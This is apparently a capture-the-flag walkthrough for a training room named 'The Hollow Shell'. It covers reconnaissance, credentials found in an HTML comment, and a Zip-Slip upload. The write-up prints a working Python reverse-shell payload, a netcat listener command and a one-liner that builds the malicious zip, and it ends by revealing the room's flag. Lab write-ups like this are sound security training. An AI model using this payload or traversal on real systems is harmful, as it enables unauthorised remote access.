**Room 10 (The Hollow Shell) = Zip-Slip - RCE**



1. `nmap` scan shows 2 open ports: `port 22` (SSH) and `port 5000` (HTTP, Flask) -> the given `URL` has to be accessed as `http://IP:5000` to be reachable
2. source page has hardcoded credentials in an HTML comment: "concierge / StayNoticed2024!" -> use to login as staff
3. `/dashboard` requires a `.zip` upload, containing a `shell.json` manifest (allowed assets: `.png` `.jpg` `.gif` `.svg` `.css` `.json`)
• here I went down a hours-long trap the room suggested, trying various `Zip-Slip` exploits
4. after couple storage tests I learn the uploaded files are available at `/shells/<id>/<file>`
5. browsing `/static/proof.css` reveals 3 directories: `/static` , `/shells` and `/hooks` -> in `/hooks` , there is a `callback.py` app
6. `Zip-Slip` a script to `../../hooks/callback.py` and start a listener `nc -lvnp 4444` to create a `reverse shell`
7. build a python helper script and upload `reverse-shell.zip`
```
cat > callback.py <<'EOF'
import socket,os,pty
s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)
s.connect(("YOUR\_IP",4444))
for fd in (0,1,2): os.dup2(s.fileno(),fd)
pty.spawn("/bin/bash")
EOF
python3 -c "import zipfile;z=zipfile.ZipFile('reverse-shell.zip','w');z.writestr('shell.json','{\\"name\\":\\"rs\\",\\"assets\\":\[]}');z.writestr('../../hooks/callback.py',open('callback.py').read());z.close()"
```
8. now logged in as `roomservice`, find flag through `cat /home/roomservice/flag.txt` -> flag: ***THM{z1p\_sl1pp3d\_1nt0\_a\_sh3ll}***



`nmap scan -> commented credentials for login -> Zip-Slip -> /static/proof.css reveals /hooks/callback.py -> reverse shell -> python helper script -> roomservice login -> flag`



